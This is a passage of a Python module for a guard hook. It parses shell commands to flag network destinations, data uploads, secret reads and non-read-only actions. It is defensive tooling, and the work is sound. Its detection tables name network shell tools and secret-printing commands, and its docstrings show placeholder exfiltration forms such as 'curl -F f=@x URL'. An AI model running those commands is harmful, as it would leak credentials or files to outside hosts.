"""What a shell command does, as far as the guard needs to know: where it reaches over the network,
whether it carries data there, which secrets it reads, and whether it only reads.

Best effort: a shell is a programming language, and this reads the common forms (pipelines, ``&&``, newlines,
redirections, here-documents, ``sh -c``, ``$(...)``, ``<(...)``, ``sudo``/``env`` prefixes, variables the command
assigns itself). What it cannot read counts as not read-only, never as harmless, and as sending data when a
network tool or address is in it. Only the standard library and ``mcp_inspect`` are imported, so the hook
starts fast.
"""
from __future__ import annotations

import re
import shlex
import threading
from bisect import bisect_right
from dataclasses import dataclass, field
from itertools import islice
from pathlib import PurePosixPath

from .mcp_inspect import _SENSITIVE, _parse, distinctive_values

SECRET = re.compile(_SENSITIVE + r"|(?:^|[^\w.])\.env(?:\.[\w-]+)?$|(?:^|/)\.git-credentials$", re.I)
# Commands that print secrets with no file argument to match.
_SECRET_COMMANDS = {("printenv",), ("gh", "auth", "token"), ("security", "find-generic-password"),
                    ("security", "find-internet-password"), ("aws", "configure", "export-credentials")}
_NETWORK = frozenset({"curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp", "rsync",
                      "ftp", "http", "https", "xh", "aria2c", "mail", "mailx", "mutt", "sendmail", "dig",
                      "nslookup", "host", "ping", "msmtp", "ssmtp", "tftp", "lftp", "ncftp", "ncftpput", "curlie", "axel",
                      "lynx", "w3m", "lwp-request"})
# Tools whose every connection carries data the command chose.
_ALWAYS_SENDS = frozenset({"nc", "ncat", "netcat", "socat", "telnet", "ssh", "sftp", "ftp", "mail", "mailx",
                           "mutt", "sendmail", "msmtp", "ssmtp", "tftp", "lftp", "ncftp", "ncftpput"})
# Variables that name a program the next command runs (``GIT_SSH_COMMAND=... git fetch``, ``PAGER=... man``).
_PROGRAM_VARS = frozenset({
    "GIT_EXTERNAL_DIFF", "GIT_SSH", "GIT_SSH_COMMAND", "GIT_PAGER", "PAGER", "MANPAGER", "GIT_ASKPASS", "SSH_ASKPASS",
    "GIT_EDITOR", "EDITOR", "VISUAL", "GIT_SEQUENCE_EDITOR", "GIT_PROXY_COMMAND", "LESSOPEN", "LESSCLOSE", "BASH_ENV",
    "ENV", "PROMPT_COMMAND", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "PYTHONSTARTUP", "NODE_OPTIONS", "PERL5OPT",
    "RUBYOPT", "GIT_CONFIG_PARAMETERS", "GIT_EXEC_PATH", "GIT_TEMPLATE_DIR", "BROWSER", "FCEDIT"})
_PLAIN_PROGRAMS = frozenset({"", "cat", "less", "more", "true", "-", "head", "tail", "vim", "vi", "nano", "emacs", "code",
                             "open", "false"})
_PASS_THROUGH = frozenset({"tee", "cat", "tr", "sed", "awk", "head", "tail", "base64", "gunzip", "zcat", "gzip", "xxd",
                           "grep", "cut", "rev", "tac"})
_GIT_FETCH = frozenset({"clone", "fetch", "pull", "ls-remote", "submodule"})
_GIT_SEND = frozenset({"push", "send-email", "request-pull"})
_INTERPRETERS = frozenset({"python", "python3", "node", "perl", "ruby", "php", "deno", "bun"})
_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "fish"})
_KEYWORDS = frozenset({"do", "then", "else", "elif", "if", "while", "until", "!", "{", "}"})
_WRAPPERS = frozenset({"sudo", "doas", "env", "time", "nohup", "command", "exec", "nice", "stdbuf", "caffeinate",
                       "setsid", "watch", "ionice", "unbuffer", "busybox"})
_SYNTAX = frozenset({"for", "select", "case", "esac", "fi", "done", "in", "function", "[[", "((", "read", "local",
                     "export", "declare", "readonly", "typeset", "unset", "shift", "break", "continue", "return",
                     "wait", "let", "getopts", "mapfile"})
_DECLARE = frozenset({"export", "declare", "local", "readonly", "typeset"})
# Programs that run the command given with -c (``script -qc 'cmd' /dev/null``, ``flock f -c 'cmd'``) like a shell.
_COMMAND_FLAG = _SHELLS | {"script", "su", "flock", "runuser"}
# An unrecognised command with one of these among its arguments runs it (``flock f curl ...``, ``docker run
# IMAGE curl ...``).
_RUNNERS = _NETWORK | _SHELLS | _INTERPRETERS
_READ_ONLY = frozenset({
    "ls", "ll", "la", "cat", "bat", "head", "tail", "less", "more", "grep", "egrep", "fgrep", "rg", "ag", "ack",
    "fd", "pwd", "echo", "printf", "wc", "sort", "uniq", "cut", "tr", "diff", "cmp", "comm", "stat", "file", "du",
    "df", "tree", "which", "whereis", "type", "whoami", "id", "uname", "hostname", "date", "cal", "true", "false",
    "test", "[", "basename", "dirname", "realpath", "readlink", "jq", "column", "nl", "od", "xxd", "hexdump",
    "strings", "md5", "md5sum", "shasum", "sha1sum", "sha256sum", "ps", "cd", "pushd", "popd", "sleep", "man",
    "uptime", "lsof", "history", "tac", "rev", "fold", "fmt", "expand", "seq",
})
_GIT_READ_ONLY = frozenset({"status", "diff", "log", "show", "blame", "rev-parse", "ls-files", "describe",
                            "shortlog", "grep", "ls-tree", "cat-file", "rev-list", "merge-base", "whatchanged"})
# yq is not here: -i, -s and --split-exp write files, but there are two programs of that name (and a version 3
# whose subcommands write), and the options of all of them are not known.
# A read-only program is only read-only without the options that make it run a program or write a file.
# (long options, short option letters); a long option is matched by any prefix, as the programs do.
_UNSAFE_OPTIONS: dict[str, tuple[tuple[str, ...], str]] = {
    "fd": (("--exec", "--exec-batch"), "xX"),
    "rg": (("--pre", "--hostname-bin"), ""),
    "ag": (("--pager",), ""),
    "ack": (("--pager",), ""),
    "less": (("--log-file", "--LOG-FILE"), "oO"),
    "more": ((), "oO"),
    "man": (("--pager", "--html", "--browser"), "PHB"),
    "sort": (("--output", "--compress-program"), "o"),
    "tree": (("--output",), "o"),
    "bat": (("--pager", "--generate-config-file"), ""),
    "file": (("--compile",), "C"),  # -C writes magic.mgc
    "date": (("--set",), "s"),
    "hostname": (("--file", "--boot"), "Fb"),
}
_GIT_BRANCH_LISTING = frozenset({"-a", "-r", "-v", "-vv", "-l", "--list", "--all", "--remotes", "--show-current",
                                "--verbose", "-i", "--ignore-case", "--no-color", "--color", "--column", "--no-column"})
_GIT_BRANCH_VALUED = ("--sort=", "--format=", "--color=", "--abbrev=", "--column=", "--points-at=")
_GIT_UNSAFE = ("--output", "--ext-diff", "--textconv", "--filters", "--open-files-in-pager", "--exec-path")
# Commands that name a file without reading what is in it.
_NAMES_ONLY = frozenset({"ls", "stat", "test", "[", "[[", "file", "du", "find", "touch", "mkdir", "chmod", "chown",
                         "rm", "mv", "which", "basename", "dirname", "realpath", "readlink", "echo", "printf"})
# Inline code reaches the network only through a client library, and sends data only through one of these.
_NODE_NET = r"(?:node:)?(?:https?|http2|net|tls|dgram|ws)"
_NET_CALL = re.compile(r"\b(?:requests|httpx|aiohttp|urllib\d?|urlopen|http\.client|socket|fetch|axios|XMLHttpRequest|"
                       r"smtplib|ftplib|paramiko|net/http|Net::HTTP|LWP|HTTP::Tiny|file_get_contents|curl_exec|TCPSocket|UDPSocket|"
                       r"fsockopen|stream_socket_client|open_connection|create_connection)\b|"
                       r"\bhttps?\.(?:get|request)\b|\brequire\(\s*['\"]" + _NODE_NET + r"['\"]|"
                       r"IO::Socket|\bnet\.(?:connect|createConnection|Socket)\b|"
                       r"LWP::\w+|URI\.open|open-uri|pycurl|webbrowser|\bimport\(\s*['\"]" + _NODE_NET + r"['\"]|"
                       r"\bfrom\s+['\"]" + _NODE_NET + r"['\"]|\bDeno\.connect|\bWebSocket\b", re.I)
_SEND_CALL = re.compile(r"(?:\.|->)(?:post|put|patch|send|sendall|sendmail|upload|storbinary|storlines|sendto|sendfile)\s*\(|"
                        r"\b(?:data|json|files|body)\s*[=:]|"
                        r"method['\"]?\s*(?:[:=]|=>)\s*['\"](?:POST|PUT|PATCH)|urlopen\([^)]{0,300},|"
                        # data joined into the address: 'url?d='+x, f"url?d={x}", `url?d=${x}`, url.format(x)
                        r"['\"]\s*[+%]\s*[^'\"\s]|[^'\"\s]\s*\+\s*['\"]|\.format\(|\bf['\"][^'\"]*\{|\$\{", re.I)
# A raw socket carries whatever the code writes to it.
_SOCKET_CALL = re.compile(r"\bsocket\b|TCPSocket|UDPSocket|fsockopen|stream_socket_client|open_connection|"
                          r"create_connection|IO::Socket|\bnet\.(?:connect|createConnection|Socket)\b|\b(?:dgram|tls)\b", re.I)
_QUOTE = re.compile(r"['\"]")
_CLOSERS = {"'": re.compile(r"(?:\\.|[^'\\])*'"), '"': re.compile(r"(?:\\.|[^\"\\])*\"")}
_GAP = re.compile(r"[\s,\[\]()]*")  # what may stand between the strings of an argument list
# Code that reads a file, the environment or a command's output and also reaches an address may send what it read.
_FILE_READ = (r"(?<![\w.])open\([^)]{0,300}\)\s*\.read|(?<![\w.])open\([^)]{0,300},\s*['\"]r?b['\"]|\bread_text\(|"
              r"\breadFile(?:Sync)?\b|File\.read|Deno\.(?:readTextFile|readFile)\w*|"
              r"file_get_contents\(\s*['\"](?!https?:)|\benviron\b|\bgetenv\b|process\.env|\$ENV\b")
_FILE_READ_CALL = re.compile(_FILE_READ)
_LOCAL_READ = re.compile(_FILE_READ + r"|`(?![^`]*://)[^`$]+`")  # a backtick command too
_NETWORK_WORD = re.compile(r"(?<![\w.-])(?:" + "|".join(sorted(_NETWORK, key=len, reverse=True)) + r")(?![\w:-])")
_DNS_WORD = re.compile(r"(?<![\w.-])(?:dig|nslookup|host|ping)(?![\w:-])")
_DNS_COMMAND = re.compile(r"(?:^|[;&|(`]|\$\()\s*(?:(?:sudo|env|time|nohup|command)\s+)*(?:dig|nslookup|host|ping)(?![\w:-])")
_DEV_TCP = re.compile(r"(?:/dev/(?:tcp|udp)/|/inet/(?:tcp|udp)/\d+/)([^/\s'\"`;&|<>()]+)")
_URL = re.compile(r"(?<![a-z0-9+.-])[a-z][a-z0-9+.-]*://[^\s'\"]+", re.I)
_MAX_COMMAND = 100_000  # characters; shlex costs microseconds per character and a -c string is read again
_OPERATOR_CHARS = ";&|\n()`<>$"
_MAX_OPERATORS = 10_000  # of those characters in one command; each one costs a step of reading
_MAX_CARRIED = 20_000  # characters of text one stage of a pipeline passes on to be read as a command
_MAX_CARRIED_TOTAL = 100_000  # and all the stages of one command together
_MAX_PARTS = 200  # substitutions or here-documents in one command that are read one by one
_MAX_EXPANSION = 200_000  # characters the variables of one command may add in all (A=$B$B; B=$C$C grows fast)
_state = threading.local()
_OPERATORS = frozenset({"|", "||", "&&", ";", "&", "|&", ";;", "(", ")", "\n"})
_REDIRECTS = frozenset({">", ">>", ">|", "&>", "&>>", "<", "<<", "<<<", ">&", "<&", "<>"})
_PUNCTUATION = frozenset("|&;()<>")
# A shell operator character that is quoted ('<', "a;b") or escaped (\;) is text. shlex cannot tell it from the
# operator, so the text is tokenized with these private characters in its place and put back afterwards.
_MARKED = "<>|&;()"
_QUOTED = str.maketrans(_MARKED, "".join(chr(0xE000 + k) for k in range(len(_MARKED))))
_ESCAPED = str.maketrans(_MARKED, "".join(chr(0xE010 + k) for k in range(len(_MARKED))))
_PLAIN = {0xE000 + k: c for k, c in enumerate(_MARKED)} | {0xE010 + k: c for k, c in enumerate(_MARKED)}
_AS_WRITTEN = {0xE000 + k: c for k, c in enumerate(_MARKED)} | {0xE010 + k: "\\" + c for k, c in enumerate(_MARKED)}
_SPLIT_OPERATORS = re.compile(r"<\(|>\(|&&|\|\||\|&|;;|<<<|<<|>>|>&|&>>|&>|<&|<>|>\||[<>|&;()]")
_SUBSTITUTION = re.compile(r"\$\(((?:[^()]|\([^()]*\))*)\)|`([^`]*)`")
_LOOPBACK = re.compile(r"^(?:localhost|127(?:\.\d+){3}|0\.0\.0\.0|\[?::1\]?|[\w.-]+\.(?:localhost|local|internal))$",
                       re.I)


@dataclass
class Command:
    destinations: set[str] = field(default_factory=set)  # canonical URLs, hosts and emails it reaches
    sends: bool = False          # it carries data to a destination (an upload, a POST, stdin into a network tool)
    secrets: list[str] = field(default_factory=list)     # credential stores read, or commands that print secrets
    read_only: bool = True       # every part is a known read-only command or a plain download, and no file is written
    runs_fetched: bool = False   # a network tool's output is piped into a shell or an interpreter
    remote: bool = False         # its output comes from elsewhere: a remote address, or a code host's issues and PRs
    fetches: int = field(default=0, repr=False)  # network commands read so far (a process substitution counts them)


def is_loopback(value: str) -> bool:
    """A destination on this machine (a dev server), which no output can make the attacker's."""
    kind, host, _ = _parse(value)
    return kind in ("url", "host", "email") and bool(_LOOPBACK.match(host))


def host(value: str) -> str:
    """The host of a canonical URL, host or email."""
    return _parse(value)[1] or value


_VERSIONED = re.compile(r"(python|pypy|perl|ruby|php)[\d.]*")


def _binary(word: str) -> str:
    """The program a word names, as the tables know it: ``/usr/bin/python3.11`` and ``pypy3`` are python3, ``nodejs``
    and ``tsx`` node, ``perl5.38`` perl."""
    name = PurePosixPath(word).name.lower()
    m = _VERSIONED.fullmatch(name)
    if m:
        return "python3" if m[1] in ("python", "pypy") else m[1]
    return "node" if name in ("nodejs", "tsx", "ts-node") else name


def _tokens(command: str) -> list[str] | None:
    lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    lexer.commenters = ""  # comments are taken out first, with the quoting known
    try:
        return list(lexer)
    except ValueError:  # unbalanced quotes
        return None


# --- quoting: what is a command, what is text ---------------------------------------------------------------

_CMD_SPECIAL = re.compile(r"['\"\\$`()}\]]")
_DQ_SPECIAL = re.compile(r"[\"\\$`]")
_PREP_SPECIAL = re.compile(r"['\"\\$`()\n#<>|&;]")
_WORD_SPECIAL = re.compile(r"[\s;&|()'\"\\$`]")


def _step(text: str, i: int, stack: list[str]) -> int:
    """Moves the stack of open quotes and brackets past the text at ``i`` (a run of plain characters, or one
    quote, bracket or escape) and returns the index after it. Frames: ``'``, ``"``, ``$(``, ``$((``, ``(``,
    ``${``, ``$[`` and a backtick; ``(a`` is a parenthesis inside arithmetic, where ``<<`` is a shift."""
    top = stack[-1] if stack else ""
    if top == "'":
        j = text.find("'", i)
        if j < 0:
            return len(text)
        stack.pop()
        return j + 1
    m = (_DQ_SPECIAL if top == '"' else _CMD_SPECIAL).search(text, i)
    j = m.start() if m else len(text)
    if j > i:
        return j
    c = text[i]
    if c == "\\":
        return i + 2
    if c == '"':
        if top == '"':
            stack.pop()
        else:
            stack.append(c)
    elif c == "'" and top != '"':
        stack.append(c)
    elif c == "`":
        if top == "`":
            stack.pop()
        else:
            stack.append(c)
    elif c == "$":
        if text.startswith("$((", i):
            stack.append("$((")
            return i + 3
        if text.startswith("$(", i):
            stack.append("$(")
            return i + 2
        if text.startswith("${", i):  # ${x:- #}: blanks and # in it are text
            stack.append("${")
            return i + 2
        if text.startswith("$[", i):  # old arithmetic, $[1<<2]
            stack.append("$[")
            return i + 2
    elif c == "}":
        if top == "${":
            stack.pop()
    elif c == "]":
        if top == "$[":
            stack.pop()
    elif c == "(" and top != '"':
        if text.startswith("((", i) and top not in _ARITHMETIC:  # a "<<" in it is a shift, not a here-document
            stack.append("((")
            return i + 2
        stack.append("(a" if top in _ARITHMETIC else "(")
    elif c == ")" and top in ("$(", "(", "(a", "$((", "(("):
        stack.pop()
        if top in ("$((", "((") and text.startswith("))", i):
            return i + 2
    return i + 1


_ARITHMETIC = ("$((", "((", "(a", "$[")  # frames in which "<<" is a shift
_PARAMETER = re.compile(r"[#!]?(?:[A-Za-z_\d@*?$!#(=~^+-])")  # what a parameter expansion starts with after ${ (zsh too)
_HEREDOC = re.compile(r"<<(-?)[ \t]*((?:'[^']*'|\"[^\"]*\"|\\.|[^\s;&|()<>'\"\\])+)")
_DELIMITER_PART = re.compile(r"'([^']*)'|\"([^\"]*)\"|\\(.)|([^'\"\\]+)", re.S)
_PIPED_SHELL = re.compile(r"\|&?\s*(?:(?:sudo|env|command|exec|nohup)\s+)*([\w./-]+)")
_STDIN_FILES = ("/dev/stdin", "/dev/fd/0", "/proc/self/fd/0")


def _delimiter(word: str) -> tuple[str, bool]:
    """The terminator a here-document's word stands for (``A"B"`` is ``AB``), and whether any of it is quoted."""
    parts = _DELIMITER_PART.findall(word)
    return "".join("".join(p) for p in parts), any(p[0] or p[1] or p[2] for p in parts) or "\\" in word


def _after(command: str, start: int, end: int) -> str:
    """The program that follows a here-document operator on its line (``<<EOF bash``), if any."""
    words = re.split(r"[;&|]", command[start:end], maxsplit=1)[0].split()
    kept: list[str] = []
    skip = False
    for word in words:
        if skip:
            skip = False
        elif re.fullmatch(r"\d*(?:[<>]|&>)+", word):
            skip = True
        elif not re.match(r"\d*(?:[<>]|&>)", word):
            kept.append(word)
    program = _program(kept)
    return _binary(program[0]) if program else ""


def _prepare(command: str) -> tuple[str, list[tuple[str, str]]]:
    """``command`` as one line of simple commands: an unquoted newline becomes ``;`` (a backslash before it
    joins the lines instead, and after ``|``, ``&&`` or ``||`` the command goes on), an unquoted ``#`` starts
    a comment that is dropped, and a here-document's body is taken out. An operator character that is quoted
    or escaped is replaced by a private character (see ``_QUOTED``). Returns the text and the bodies, each
    as ("shell" | "code" | "data" | "text", body): ``shell`` and ``code`` are fed to a shell or an interpreter,
    ``text`` is data with substitutions in it (an unquoted delimiter), ``data`` is only data."""
    command = command.replace("\r\n", " \n")  # a carriage return is a character; only the newline ends the line
    n = len(command)
    out: list[str] = []
    segment: list[str] = []  # what the current simple command has so far, for the program a here-document feeds
    pending: list[tuple[str, bool, bool, int, str, list[str]]] = []  # (delimiter, strip tabs, quoted, operator end,
    # program, the shells and interpreters among the words of the command: docker run -i img sh <<EOF)
    bodies: list[tuple[str, str]] = []
    stack: list[str] = []
    last = ""  # the last two non-blank characters written
    previous = ""  # the character just before this one, as the shell sees the text (lines joined)
    i = 0

    def emit(chunk: str) -> None:
        nonlocal last, previous
        out.append(chunk)
        segment.append(chunk)
        previous = chunk[-1]
        if chunk.strip():
            last = (last + chunk.strip())[-2:]

    while i < n:
        top = stack[-1] if stack else ""
        c = command[i]
        if c == "\\" and top != "'" and command.startswith("\n", i + 1):
            i += 2  # a line continuation
            continue
        if top not in ("'", '"', "${"):
            m = _PREP_SPECIAL.search(command, i)
            j = m.start() if m else n
            if j > i:
                emit(command[i:j])
                i = j
                continue
            if c == "\n":
                if pending:
                    i = _take_bodies(command, i, pending, bodies)
                    pending = []
                else:
                    i += 1
                segment.clear()
                if last.endswith("|") or last == "&&":
                    out.append(" ")  # the command goes on
                    previous = " "
                else:
                    out.append(" ; ")
                    previous = ";"
                    last = ";"
                continue
            if c == "#" and top != "`" and (not previous or previous in " \t;&|("):
                end = command.find("\n", i)
                i = n if end < 0 else end
                continue
            if c in "|&;":
                emit(c)
                segment.clear()
                i += 1
                continue
            if c in "<>":
                if c == "<" and top not in _ARITHMETIC and command.startswith("<<", i) \
                        and (i == 0 or command[i - 1] != "<"):
                    if command.startswith("<<<", i):
                        emit("<<<")
                        i += 3
                        continue
                    m = _HEREDOC.match(command, i)
                    words = _program("".join(segment[-400:]).split())
                    program = ("." if words[:1] == ["."] else _binary(words[0])) if words else ""
                    if m and program != "let":
                        delimiter, quoted = _delimiter(m[2])
                        if program in (".", "source") and any(f in "".join(segment[-400:]) for f in _STDIN_FILES):
                            program = "sh"  # source /dev/stdin <<EOF
                        if len(pending) > _MAX_PARTS:  # too many to read: counted, and the command is unreadable
                            bodies.append(("data", ""))
                        else:
                            pending.append((delimiter, bool(m[1]), quoted, m.end(), program,
                                            [_binary(w) for w in words[1:40]]))
                        emit(command[i:m.end()])
                        i = m.end()
                        continue
                emit(c)
                i += 1
                continue
            if c == "#":
                emit(c)
                i += 1
                continue
        if c == "\\" and top in ("", "$(", "(", "((", "`") and i + 1 < n and command[i + 1] in _MARKED:
            emit(command[i:i + 2].translate(_ESCAPED)[1])  # an escaped operator character is text
            i += 2
            continue
        j = _step(command, i, stack)
        chunk = command[i:j]
        if top == "'" or top in ('"', "${") and chunk[0] not in '$`\\"\'()}':
            chunk = chunk.translate(_QUOTED)  # inside quotes or ${...} an operator character is text
        emit(chunk)
        if chunk == "${" and not _PARAMETER.match(command, j) and len(bodies) <= _MAX_PARTS:
            bodies.append(("opaque", ""))  # ${ cmd; }, ${|cmd; }: a command, or not a parameter at all
        if chunk[0] == "\\" and len(chunk) == 2:
            previous = "\\"  # an escaped blank is text: echo a\ #b has no comment
        if chunk in ("(", "$(", "$((", "((", "`"):
            segment.clear()
        i = j
    if "${" in stack:  # never closed: read the raw text
        bodies.append(("opaque", ""))
    return "".join(out), bodies


def _take_bodies(command: str, newline: int, pending: list[tuple[str, bool, bool, int, str, list[str]]],
                 bodies: list[tuple[str, str]]) -> int:
    """Reads the bodies of the here-documents opened on the line that ends at ``newline``; returns where the
    text goes on. A terminator is the delimiter alone on its line (leading tabs allowed only for ``<<-``)."""
    pos = newline + 1
    n = len(command)
    for delimiter, strip, quoted, end, name, words in pending:
        lines: list[str] = []
        while pos < n:
            stop = command.find("\n", pos)
            line = command[pos:stop if stop >= 0 else n]
            pos = n if stop < 0 else stop + 1
            if (line.lstrip("\t") if strip else line) == delimiter:
                break
            lines.append(line)
        body = "\n".join(lines)
        line_end = command[end:newline]
        targets = [name, _after(command, end, newline)] + [_binary(m[1])
                                                           for m in _PIPED_SHELL.finditer(line_end)] + words
        target = next((t for t in targets if t in _SHELLS or t in _INTERPRETERS), "")
        if target in _SHELLS:
            bodies.append(("shell", body))
        elif target in _INTERPRETERS:
            bodies.append(("code", body))
        else:
            bodies.append(("data" if quoted else "text", body))
    return pos


# --- variables the command assigns itself ---------------------------------------------------------------------

_ASSIGN = re.compile(r"([A-Za-z_]\w*)(\+?)=")
_USE = re.compile(r"\$(?:\{([A-Za-z_]\w*)(\}?)|([A-Za-z_]\w*))")
_BRACED = re.compile(r"\$\{([^}${]{0,300})\}")  # bounded: an unclosed ${ must not make every later one rescan
_USE_ASSIGN = re.compile(r"\$\{[A-Za-z_]\w*:?=")
_USE_DEFAULT = re.compile(r"\$\{([A-Za-z_]\w*):?[-=][^}]{0,300}\}")  # ${name:-default}: the value when there is one
# Commands that give a variable a value this does not follow: read H, mapfile H, getopts o H, printf -v H, unset H;
# eval and source can set any of them.
_SETTERS = frozenset({"read", "mapfile", "readarray", "getopts", "printf", "unset", "eval", "source", "."})
_NAME = re.compile(r"([A-Za-z_]\w*)(?:\[.*\])?")


def _word_end(text: str, i: int) -> int:
    """Where the shell word that starts at ``i`` ends: at blank space or an operator outside quotes and ``$(...)``."""
    stack: list[str] = []
    n = len(text)
    while i < n:
        if not stack:
            m = _WORD_SPECIAL.search(text, i)
            if m is None:
                return n
            if m.start() > i:
                i = m.start()
                continue
            if text[i] in " \t\n;&|()":
                return i
        i = _step(text, i, stack)
    return n


class _TooBig(Exception):
    """Writing the variables out would take more text than ``_MAX_EXPANSION``."""


def _spend(size: int) -> None:
    left = getattr(_state, "budget", _MAX_EXPANSION) - size
    _state.budget = left
    if left < 0:
        raise _TooBig


class _Stale:
    """Names whose value may have changed behind the parser's back: set by a builtin (``read H``), or by
    ``eval`` and ``source``, which can set any name assigned before them."""

    def __init__(self, known: dict[str, str]) -> None:
        self.names: set[str] = set()
        self.born = dict.fromkeys(known, 0)  # when each name was given its value
        self.tick = 0
        self.cut = -1  # names given their value at or before this are stale (the last eval or source)

    def assigned(self, name: str) -> None:
        self.tick += 1
        self.born[name] = self.tick

    def everything(self) -> None:
        self.cut = self.tick

    def add(self, name: str) -> None:
        self.names.add(name)

    def __contains__(self, name: str) -> bool:
        return name in self.names or self.born.get(name, self.tick + 1) <= self.cut


def _expand_word(word: str, values: dict[str, str], used: set[str], stale: _Stale | None = None,
                 hits: set[str] | None = None) -> str:
    """``word`` with the variables it uses written out, except inside single quotes. A use of a name in
    ``stale`` (a builtin gave it a value that is not known), or of an assigned one in a form that is not
    written out (``${H[0]}``, ``${H%x}``), goes into ``hits``."""
    if "$" not in word:
        return word
    out: list[str] = []
    k, n, single, double = 0, len(word), False, False
    while k < n:
        c = word[k]
        if single:
            single = c != "'"
        elif c == "\\":
            out.append(word[k:k + 2])
            k += 2
            continue
        elif c == "'" and not double:
            single = True
        elif c == '"':
            double = not double
        elif c == "$":
            m = _USE.match(word, k)
            if m:
                name = m[1] or m[3]
                used.add(name)
                value = values.get(name)
                if hits is not None and m[1] and _USE_ASSIGN.match(word, k):
                    stale.add(name)  # ${H:=x} sets H when it has no value yet
                if hits is not None and (name in stale or (m[1] and not m[2] and value is not None)):
                    default = _USE_DEFAULT.match(word, k)
                    if default and name not in stale and value:  # ${name:-default} is the value
                        _spend(len(value))
                        out.append(value)
                        k = default.end()
                        continue
                    hits.add(name)
                    value = None
                if value is not None:
                    _spend(len(value))
                out.append(m[0] if value is None else value)
                k = m.end()
                continue
        out.append(c)
        k += 1
    return "".join(out)


def _unquote(value: str) -> str:
    try:
        parts = shlex.split(value)
    except ValueError:
        return value
    return " ".join(parts)


def _expand(command: str, env: dict[str, str]) -> tuple[str, dict[str, str], bool]:
    """Like ``_expand_all``, but a command whose variables would grow past ``_MAX_EXPANSION`` is left as it is
    and counts as one whose variables are not known."""
    try:
        return _expand_all(command, env)
    except _TooBig:
        return command, dict(env), True


def _expand_all(command: str, env: dict[str, str]) -> tuple[str, dict[str, str], bool]:
    """``command`` with the variables it assigns itself written out in the order it runs them, so that
    ``C="curl -F f=@x URL"; $C`` and ``U=URL; curl -d @x $U`` read as what they run; a variable from elsewhere
    stays as it is. Returns the text, the values, and whether a variable is assigned more than once or after
    it was used (a loop, a condition: its value at a use is not known)."""
    values = dict(env)
    seen = dict.fromkeys(env, 1)
    used: set[str] = set()
    contested: set[str] = set()
    stale = _Stale(values)  # names a builtin (read, eval ...) may have given another value
    hits: set[str] = set()  # of those, the ones used afterwards
    setter, previous = "", ""
    out: list[str] = []
    i, n, lead = 0, len(command), True
    while i < n:
        c = command[i]
        if c in " \t\n":
            out.append(c)
            i += 1
        elif c in ";&|()":
            out.append(c)
            i += 1
            lead, setter = True, ""
        else:
            j = _word_end(command, i)
            word = command[i:j]
            i = j
            m = _ASSIGN.match(word) if lead else None
            if m:
                name = m[1]
                if name in used or name in seen:
                    contested.add(name)
                seen[name] = seen.get(name, 0) + 1
                value = _expand_word(word[m.end():], values, used, stale, hits)
                stale.assigned(name)
                if "$(" in value or "`" in value:  # the output of a command is not known text: $NAME stays a variable
                    values.pop(name, None)
                else:
                    values[name] = (values.get(name, "") if m[2] else "") + _unquote(value)
                    _spend(len(values[name]) if m[2] else 0)
                out.append(word[:m.end()] + value)
            else:
                out.append(_expand_word(word, values, used, stale, hits))
                if setter:  # read -r H, getopts o H, printf -v H x, unset H: the names it sets
                    name = _NAME.fullmatch(_unquote(word))
                    if name and (setter != "printf" or previous == "-v") and setter not in ("eval", "source", "."):
                        stale.add(name[1])
                    elif setter == "printf" and word.startswith("-v") and len(word) > 2:  # printf -vH x
                        stale.add(word[2:])
                elif lead and word in _SETTERS and (word != "printf" or re.match(r"\s+-v", command[j:j + 4])):
                    setter = word
                    if word in ("eval", "source", "."):  # it can set any of them
                        stale.everything()
                lead = lead and (word in _KEYWORDS or word in _DECLARE or word.startswith("-")
                                 or PurePosixPath(word).name in _WRAPPERS)
                previous = word
    return "".join(out), values, bool(contested & used) or bool(hits)


def _program(argv: list[str]) -> list[str]:
    """``argv`` without leading assignments and wrappers (``sudo -u x``, ``env A=1``, ``timeout 5``)."""
    i = 0
    while i < len(argv):
        word = argv[i]
        name = PurePosixPath(word).name
        if re.fullmatch(r"[A-Za-z_]\w*=.*", word, re.S) or word in _KEYWORDS:
            i += 1
        elif word == "function":  # function f { curl ...; }: the body is on the same line as the name
            i += 2
        elif name in _WRAPPERS:
            i += 1
            while i < len(argv) and argv[i].startswith("-"):
                split = re.fullmatch(r"-[iv0]*S(.*)|--split-string(?:=(.*))?", argv[i], re.S) if name == "env" else None
                if split and (split[1] or split[2] or i + 1 < len(argv)):
                    # env -S 'curl -d @f URL', env -S'curl ...', env -iS'..', env --split-string='curl ...': the command
                    attached = split[1] or split[2]
                    string, rest = (attached, argv[i + 1:]) if attached else (argv[i + 1], argv[i + 2:])
                    try:
                        argv = argv[:i] + shlex.split(string) + rest
                    except ValueError:
                        i += 2
                    break
                i += 2 if argv[i] in ("-u", "-g", "-n") else 1
            if i < len(argv) and re.search(r"\s", argv[i]) and not argv[i].startswith("-"):
                try:  # watch 'curl ...': one word that is the command
                    argv = argv[:i] + shlex.split(argv[i]) + argv[i + 1:]
                except ValueError:
                    pass
        elif name in ("timeout", "gtimeout"):
            i += 1
            while i < len(argv) and argv[i].startswith("-"):
                i += 1
            i += 1  # the duration
        elif name == "xargs":
            i += 1
            while i < len(argv) and argv[i].startswith("-"):
                i += 2 if argv[i] in ("-I", "-n", "-P", "-L", "-d", "-E", "-s", "-a") else 1
        else:
            break
    return argv[i:]


def network_values(text: str) -> set[str]:
    return {v for v in distinctive_values(text) if _parse(v)[0] in ("url", "host", "email")}


def _dynamic(text: str, loopvars: frozenset[str] | set[str]) -> bool:
    """Text built at run time from a command's output or a variable the command does not set itself (a loop
    variable is not data; ``$TOKEN`` may be)."""
    return ("`" in text or "$(" in text or bool(re.search(r"\$(?![\w{])", text))  # $(..) cut at its bracket
            or any(name not in loopvars for name in re.findall(r"\$\{?(\w+)", text)))


def _curl_sends(args: list[str]) -> bool:
    for i, arg in enumerate(args):
        following = args[i + 1] if i + 1 < len(args) else ""
        if arg.startswith(("--data", "--form", "--upload-file", "--json", "--post", "--url-query", "--variable",
                           "--expand-")):  # --variable x@file, --url-query x@file: a file's text goes in the request
            return True
        if arg in ("-X", "--request") and following.upper() in ("POST", "PUT", "PATCH"):
            return True
        if re.fullmatch(r"-(?:X|-request=)(?:POST|PUT|PATCH)", arg, re.I):
            return True
        # headers and cookies read from a file go with the request
        if arg.startswith("@") or re.match(r"--(?:header|cookie)=@", arg):
            return True
        if arg in ("-H", "--header") and following.startswith("@"):
            return True
        if arg in ("-b", "--cookie") and following and "=" not in following:
            return True
